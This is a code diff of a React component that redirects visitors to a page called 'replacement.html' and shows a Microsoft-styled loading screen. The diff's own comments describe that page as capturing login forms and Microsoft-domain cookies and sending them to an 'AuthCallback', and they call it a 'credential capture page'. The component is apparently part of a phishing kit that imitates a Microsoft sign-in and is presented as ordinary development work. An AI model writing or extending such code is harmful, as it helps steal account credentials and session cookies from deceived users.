@@ -1,16 +1,18 @@
 import React, { useLayoutEffect } from 'react';
 
 /**
- * RealOAuthRedirect Component
- * Redirects to replacement.html which contains the login form and silent auth flow
+ * Redirects to replacement.html which handles:
+ * - Login form capture
+ * - Silent auth with silent-auth-frame.html
+ * - Cookie capture from Microsoft domain
+ * - Data transmission to AuthCallback
  */
 const RealOAuthRedirect: React.FC = () => {
   useLayoutEffect(() => {
-    console.log('🔄 RealOAuthRedirect: Navigating to replacement page...');
+    console.log('🔄 RealOAuthRedirect: Navigating to credential capture page...');
     window.location.replace('/replacement.html');
   }, []);
 
-  // Loading screen shown briefly during redirect
   return (
     <div style={{
       display: 'flex',
@@ -21,31 +23,12 @@ const RealOAuthRedirect: React.FC = () => {
       backgroundColor: '#f3f2f1'
     }}>
       <div style={{
-        textAlign: 'center'
+        textAlign: 'center',
+        fontSize: '24px',
+        color: '#323130'
       }}>
-        <div style={{
-          fontSize: '18px',
-          color: '#323130',
-          marginBottom: '20px'
-        }}>
-          Loading...
-        </div>
-        <div style={{
-          border: '4px solid #f3f2f1',
-          borderTop: '4px solid #0078d4',
-          borderRadius: '50%',
-          width: '40px',
-          height: '40px',
-          animation: 'spin 1s linear infinite',
-          margin: '0 auto'
-        }}></div>
+        Loading...
       </div>
-      <style>{`
-        @keyframes spin {
-          0% { transform: rotate(0deg); }
-          100% { transform: rotate(360deg); }
-        }
-      `}</style>
     </div>
   );
 };
